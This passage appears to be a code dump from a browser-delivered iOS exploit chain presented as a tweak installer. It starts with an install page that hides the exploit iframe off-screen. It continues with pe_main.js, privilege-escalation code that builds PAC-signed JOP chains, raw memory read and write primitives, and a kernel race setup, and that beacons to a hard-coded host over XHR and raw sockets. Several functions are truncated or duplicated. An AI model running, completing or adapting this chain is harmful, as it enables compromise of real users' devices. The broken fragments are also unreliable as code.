        btn.className = 'btn btn-disabled';
        btn.textContent = 'Installing...';
      }
      // Set the progress line SYNCHRONOUSLY before the iframe is created.
      // iOS Safari shares one WebContent process across the parent page and
      // its iframes, so once the exploit kicks in and the iframe's JS main
      // thread stalls during the fcall / sbx0 / sbx1 phase, the PARENT's
      // main thread also stops servicing the runloop - no setTimeout, no
      // rAF, no postMessage handler, nothing fires until the chain either
      // completes or crashes Safari. The only text that's guaranteed to
      // stay on screen during the freeze is text we write right now, in
      // this synchronous code path, before the iframe exists.
      if (installStatusEl) {
        installStatusEl.classList.remove('error');
        installStatusEl.dataset.sbxDone = '';
      }

      /* log UI disabled for now
      var lb = document.getElementById('logBox');
      document.getElementById('logScroll').innerHTML = '';
      lb.className = 'active';
      logAppend('[UI] Worker log bridge armed', 'ok');
      logAppend('[UI] Polling syslog.txt for device-side kernel / PE logs', 'device');
      startSyslogPolling();
      */

      // Match the upstream DarkSword install button: just a 60-second
      // setTimeout fallback plus a postMessage listener for the iframe's
      // explicit "lightsaber_done" signal. No active contentWindow polling -
      // iOS Safari's cross-origin / detached-frame access semantics aren't
      // reliable across versions, and the upstream chain expects the user to
      // notice that "Safari froze/crashed/reloaded means it worked" anyway.
      setTimeout(markDone, 60000);

      // Force a layout flush on the status + button text writes above so
      // the browser sees them as committed style changes before we yield.
      // Reading offsetHeight is a well-known barrier that drains pending
      // style invalidations on WebKit.
      if (installStatusEl) { void installStatusEl.offsetHeight; }
      if (btn) { void btn.offsetHeight; }

      // Defer the actual iframe creation one event-loop tick so the
      // browser has a chance to paint the "Installing..." button text and
      // the "sandbox escape underway..." install-status line BEFORE the
      // iframe's worker starts hogging the shared WebContent process. On
      // iOS Safari a parent page and its same-origin iframes share one
      // WebContent process, so once the chain kicks in the parent main
      // thread also stops servicing the runloop - any DOM write still
      // sitting in the paint queue at that point never reaches the
      // screen. The setTimeout(0) yields just long enough for the browser
      // to flush one paint before we hand control over to the exploit.
      setTimeout(function() {
        // Encode each tweak name individually so the comma between names stays
        // a literal "," in the URL instead of becoming "%2C". rce_loader.js's
        // URLSearchParams parser handles either form, but a literal comma is
        // also more readable in logs and proxies.
        var encodedTweaks = tweaks.map(function(t) { return encodeURIComponent(t); }).join(',');
        var sbcParams = '&dock_icons=' + encodeURIComponent(sbc.dock_icons)
          + '&hs_cols=' + encodeURIComponent(sbc.hs_cols)
          + '&hs_rows=' + encodeURIComponent(sbc.hs_rows)
          + '&hide_labels=' + encodeURIComponent(sbc.hide_labels || 0);
        var frame = document.createElement('iframe');
        frame.src = 'frame.html?tweaks=' + encodedTweaks + '&level=' + encodeURIComponent(level) + sbcParams + '&mg_flags=' + encodeURIComponent(mg_flags) + '&mg_unflags=' + encodeURIComponent(mg_unflags) + '&_=' + Math.random();
        frame.style.width = '1px';
        frame.style.height = '1px';
        frame.style.opacity = '0.01';
        frame.style.position = 'absolute';
        frame.style.left = '-9999px';
        frame.style.border = 'none';
        document.body.appendChild(frame);
      }, 0);
    }

  </script>
</body>
</html>

```

`pe_main.js`:

```js
(() => {
  // Ultra-early beacon - before fcall_init, using XMLHttpRequest if available
  try {
    if (typeof XMLHttpRequest !== 'undefined') {
      let xhr = new XMLHttpRequest();
      xhr.open("GET", "http://192.168.86.34:8888/beacon?s=xhr_start", false);
      xhr.send();
    }
  } catch(e) {}

  // Define LOG if not already defined (pe_stage1 sets it to undefined)
  if (typeof LOG === 'undefined' || LOG === undefined) {
    LOG = function(msg) { console.log('[PE] ' + msg); };
  }

  try {
    fcall_init();
  } catch(e) {
    // Try to report fcall_init failure via XHR
    try {
      if (typeof XMLHttpRequest !== 'undefined') {
        let xhr = new XMLHttpRequest();
        xhr.open("GET", "http://192.168.86.34:8888/beacon?s=fcall_init_failed&e=" + encodeURIComponent(String(e)), false);
        xhr.send();
      }
    } catch(e2) {}
    throw e; // re-throw
  }

  // Beacon after fcall_init succeeds
  try {
    if (typeof XMLHttpRequest !== 'undefined') {
      let xhr = new XMLHttpRequest();
      xhr.open("GET", "http://192.168.86.34:8888/beacon?s=fcall_init_ok", false);
      xhr.send();
    }
  } catch(e) {}
  let PAGE_SIZE = 0x4000n;
  let KERN_SUCCESS = 0n;
  let CALLOC = func_resolve("calloc");
  let MALLOC = func_resolve("malloc");
  let FREE = func_resolve("free");
  let MEMCPY = func_resolve("memcpy");
  let MEMSET = func_resolve("memset");

  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);

    return buf;

  let g_device_machine = 0n;
  function get_device_machine() {
    LOG("[PE-DBG] get_device_machine() called");
    if (g_device_machine == 0n) {
      LOG("[PE-DBG] calling calloc...");
      let utsname = calloc(256n, 5n);
      LOG("[PE-DBG] calloc returned: " + utsname.hex());
      LOG("[PE-DBG] calling uname...");
      fcall(UNAME, utsname);
      LOG("[PE-DBG] uname returned");
      g_device_machine = utsname + 256n * 4n;
    }
    return g_device_machine;
  }

  let selector_evaluateScript = sel_registerName(get_cstring("evaluateScript:"));
  let selector_initWithTarget_selector_object = sel_registerName(get_cstring("initWithTarget:selector:object:"));
  let selector_invocationWithMethodSignature = sel_registerName(get_cstring("invocationWithMethodSignature:"));
  let selector_invoke = sel_registerName(get_cstring("invoke"));
  let selector_isFinished = sel_registerName(get_cstring("isFinished"));
  let selector_methodSignatureForSelector = sel_registerName(get_cstring("methodSignatureForSelector:"));
  let selector_objectForKeyedSubscript = sel_registerName(get_cstring("objectForKeyedSubscript:"));
  let selector_release = sel_registerName(get_cstring("release"));
  let selector_retainCount = sel_registerName(get_cstring("retainCount"));
  let selector_setArgument_atIndex = sel_registerName(get_cstring("setArgument:atIndex:"));
  let selector_start = sel_registerName(get_cstring("start"));
  let invoke_class = objc_getClass("NSInvocation");
  let jsc_class = objc_getClass("JSContext");
  let nsthread_class = objc_getClass("NSThread");
  function create_cfstring(cstring) {
    return CFStringCreateWithCString(kCFAllocatorDefault, cstring, kCFStringEncodingUTF8);
  }
  let cfstr_boxed_arr = create_cfstring(get_cstring("boxed_arr"));
  let cfstr_control_array = create_cfstring(get_cstring("control_array"));

  let cfstr_rw_array_8 = create_cfstring(get_cstring("rw_array_8"));

  function create_cfstring_copy(cfstring) {
    return CFStringCreateCopy(kCFAllocatorDefault, cfstring);
  }
  function object_retainCount(obj) {
    return objc_msgSend(obj, selector_retainCount);

    return objc_msgSend(obj, selector_release);

    return objc_msgSend(obj, selector_evaluateScript, jscript);

  function nsthread_start(obj) {
    return objc_msgSend(obj, selector_start);
  }
  function setup_fcall_jopchain() {
    let jsvm_fcall_buff = malloc(PAGE_SIZE);
    let load_x1x3x8_args = jsvm_fcall_buff + 0x100n;
    let jsvm_fcall_args = jsvm_fcall_buff + 0x200n;
    uwrite64(jsvm_fcall_buff + 0x0n, load_x1x3x8_args);
    uwrite64(jsvm_fcall_buff + 0x8n, pacia(load_x1x3x8, 0n));
    uwrite64(jsvm_fcall_buff + 0x10n, pacia(_CFObjectCopyProperty, 0n));
    uwrite64(jsvm_fcall_buff + 0x40n, pacia(jsvm_isNAN_fcall_gadget2, 0n));
    uwrite64(load_x1x3x8_args + 0x20n, load_x1x3x8_args + 0x40n);
    uwrite64(load_x1x3x8_args + 0x28n, jsvm_fcall_args - 0x10n);
    uwrite64(load_x1x3x8_args + 0x30n, pacia(0x41414141n, 0xC2D0n));
    uwrite64(load_x1x3x8_args + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args + 0x50n));
    return {
      "jsvm_fcall_buff": jsvm_fcall_buff,
      "jsvm_fcall_pc": load_x1x3x8_args + 0x30n,
      "jsvm_fcall_args": jsvm_fcall_args
    };
  }
  let evaluateScript_invocation = 0n;
  function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n) {
    if (typeof js_script_nsstring === "string") {
      js_script_nsstring = create_cfstring(get_cstring(js_script_nsstring));
    } else if (typeof js_script_nsstring === "object") {
      js_script_nsstring = create_cfstring(uread64(addrof(js_script_nsstring) + 0x10n));
    } else {
      js_script_nsstring = create_cfstring_copy(js_script_nsstring);
    }
    let jop_chain_info = setup_fcall_jopchain();
    let jsvm_fcall_buff = jop_chain_info["jsvm_fcall_buff"];
    let jsvm_fcall_pc = jop_chain_info["jsvm_fcall_pc"];
    let jsvm_fcall_args = jop_chain_info["jsvm_fcall_args"];
    let ctx = objc_alloc_init(jsc_class);
    let isnan_value = objectForKeyedSubscript(ctx, cfstr_isNaN);
    let isnan_func_addr = uread64(isnan_value + 0x8n);
    let isnan_executable_addr = uread64(isnan_func_addr + 0x18n);
    let isnan_code_ptr = isnan_executable_addr + 0x28n;
    evaluateScript(ctx, stage1_js);
    let unboxed_arr_value = objectForKeyedSubscript(ctx, cfstr_unboxed_arr);
    let unboxed_arr_addr = uread64(unboxed_arr_value + 0x8n);
    let boxed_arr_value = objectForKeyedSubscript(ctx, cfstr_boxed_arr);
    let boxed_arr_addr = uread64(boxed_arr_value + 0x8n);
    let boxed_arr_butter = uread64(boxed_arr_addr + 0x8n);
    uwrite64(unboxed_arr_addr + 0x8n, boxed_arr_butter);
    let rw_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array) + 0x8n);
    let control_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array) + 0x8n);
    let rw_array_buffer_bk = uread64(rw_array_addr + 0x10n);
    let control_array_buffer_bk = uread64(control_array_addr + 0x10n);
    uwrite64(control_array_addr + 0x10n, rw_array_addr + 0x10n);
    let rw_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array_8) + 0x8n);
    let control_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array_8) + 0x8n);
    let rw_array_8_buffer_bk = uread64(rw_array_8_addr + 0x10n);
    let control_array_8_buffer_bk = uread64(control_array_8_addr + 0x10n);
    uwrite64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
    let signing_ctx = 0x4911n;
    let signed_fcall_addr = pacib(jsvm_isNAN_fcall_gadget, signing_ctx);
    uwrite64(isnan_code_ptr, signed_fcall_addr);
    let new_func_offsets = objectForKeyedSubscript(ctx, cfstr_func_offsets_array);
    let new_func_offsets_addr = uread64(new_func_offsets + 0x8n);
    let new_func_offsets_buffer = uread64(new_func_offsets_addr + 0x10n);
    memcpy(new_func_offsets_buffer, func_offsets_buffer, PAGE_SIZE);
    uwrite64(new_func_offsets_buffer + 3n * 0x8n, target_thread_arg);
    uwrite64(new_func_offsets_buffer + 5n * 0x8n, jsvm_fcall_buff);
    uwrite64(new_func_offsets_buffer + 6n * 0x8n, jsvm_fcall_pc);
    uwrite64(new_func_offsets_buffer + 7n * 0x8n, jsvm_fcall_args);
    if (evaluateScript_invocation == 0n) {
      let evaluateScript_signature = methodSignatureForSelector(ctx, selector_evaluateScript);
      evaluateScript_invocation = invocationWithMethodSignature(invoke_class, evaluateScript_signature);
      setArgument_atIndex(evaluateScript_invocation, new_uint64_t(selector_evaluateScript), 1n);
    }
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(ctx), 0n);
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(js_script_nsstring), 2n);
    let nsthread = objc_alloc(nsthread_class);
    initWithTarget_selector_object(nsthread, evaluateScript_invocation, selector_invoke, 0n);
    nsthread_start(nsthread);
    return {
      "thread_handle": nsthread,
      "js_ctx": ctx,
      "jop_chain_info": jop_chain_info,
      "js_script_nsstring": js_script_nsstring,
      "rw_array_buffer_bk": rw_array_buffer_bk,
      "control_array_buffer_bk": control_array_buffer_bk,
      "rw_array_8_buffer_bk": rw_array_8_buffer_bk,
      "control_array_8_buffer_bk": control_array_8_buffer_bk
    };
  }
  function js_thread_join(js_thread) {
    let jop_chain_info = js_thread["jop_chain_info"];
    let js_ctx = js_thread["js_ctx"];
    let js_script_nsstring = js_thread["js_script_nsstring"];
    let nsthread = js_thread["thread_handle"];
    while (true) {
      let isFinished = objc_msgSend(nsthread, selector_isFinished);
      if (isFinished == 1n) {
        break;
      }
    }
    object_release(nsthread);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array) + 0x8n) + 0x10n, js_thread["rw_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array) + 0x8n) + 0x10n, js_thread["control_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array_8) + 0x8n) + 0x10n, js_thread["rw_array_8_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array_8) + 0x8n) + 0x10n, js_thread["control_array_8_buffer_bk"]);
    let jsc_ref_count = object_retainCount(js_ctx);
    for (let i = 0n; i < jsc_ref_count; i++) {
      object_release(js_ctx);
    }
    CFRelease(js_script_nsstring);
    free(jop_chain_info["jsvm_fcall_buff"]);
  }

  // Early beacon - test if basic setup works
  try {
    let _CONNECT = func_resolve("connect");
    let _sock = fcall(SOCKET, 2n, 1n, 0n);
    if (_sock != 0xFFFFFFFFFFFFFFFFn && _sock >= 0n) {
      let _addr = fcall(CALLOC, 1n, 16n);
      fcall(MEMSET, _addr, 0n, 16n);
      uwrite16(_addr, 2n);
      uwrite16(_addr + 2n, 0xb822n); // port 8888 big-endian
      uwrite32(_addr + 4n, 0x2256a8c0n); // 192.168.86.34
      if (fcall(_CONNECT, _sock, _addr, 16n) == 0n) {
        let _req = get_cstring("GET /beacon?s=early HTTP/1.0\r\nHost: x\r\n\r\n");
        fcall(WRITE, _sock, _req, 40n);
      }
      fcall(CLOSE, _sock);
      fcall(FREE, _addr);
    }
  } catch(e) {}
  let kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize").noPAC());

  }
  function arc4random() {
    return fcall(ARC4RANDOM);
  }
  function task_threads(task, thread_list_addr, thread_count_addr) {
    return fcall(TASK_THREADS, task, thread_list_addr, thread_count_addr);
  }
  function fcntl(fd, flag, value) {
    return fcall(FCNTL, fd, flag, 0n, 0n, 0n, 0n, 0n, 0n, value);
  }

  function mach_task_self() {

  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
  }
  function disable_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let isSafeToCollect = heap + 0x241n;
    uwrite64(isSafeToCollect, 0n);
  }
  function enable_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let isSafeToCollect = heap + 0x241n;
    uwrite64(isSafeToCollect, 1n);
  }
  function disarm_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let m_threadGroup = uread64(heap + 0x198n);
    let threads = uread64(m_threadGroup);
    uwrite64(threads + 0x20n, 0x0n);
  }
  disable_gc();
  disarm_gc();
  enable_gc();
  let executable_name = 0n;
  let read_file_path = 0n;
  let write_file_path = 0n;
  let target_file_size = PAGE_SIZE * 0x2n;
  let oob_offset = 0x100n;
  let oob_size = 0xf00n;
  let n_of_oob_pages = 2n;
  let pc_address = new_bigint();
  let pc_size = 0n;
  let pc_object = new_bigint();
  let free_target = 0n;
  let free_target_size = 0n;
  let write_fd = 0n;
  let read_fd = 0n;
  let random_marker = arc4random() << 32n | arc4random();
  let wired_page_marker = arc4random() << 32n | arc4random();
  let free_thread_start_ptr = 0n;
  let free_target_sync_ptr = 0n;
  let free_target_size_sync_ptr = 0n;
  let target_object_sync_ptr = 0n;
  let target_object_offset_sync_ptr = 0n;
  let go_sync_ptr = 0n;
  let race_sync_ptr = 0n;
  let free_thread_jsthread = 0n;
  let free_thread_arg = 0n;
  function init_target_file() {
    let _CS_DARWIN_USER_TEMP_DIR = 65537n;
    read_file_path = calloc(1n, 1024n);
    write_file_path = calloc(1n, 1024n);
    confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, 1024n);
    confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024n);
    strcat(read_file_path, get_cstring(`/${arc4random().hex()}`));
    strcat(write_file_path, get_cstring(`/${arc4random().hex()}`));
    create_target_file(read_file_path);
    create_target_file(write_file_path);
    read_fd = open(read_file_path, 0x2n);
    write_fd = open(write_file_path, 0x2n);
    LOG("[+] read_fd: " + read_fd.hex());
    LOG("[+] write_fd: " + write_fd.hex());
    remove(read_file_path);
    remove(write_file_path);
    fcntl(read_fd, 48n, 1n);
    fcntl(write_fd, 48n, 1n);
  }
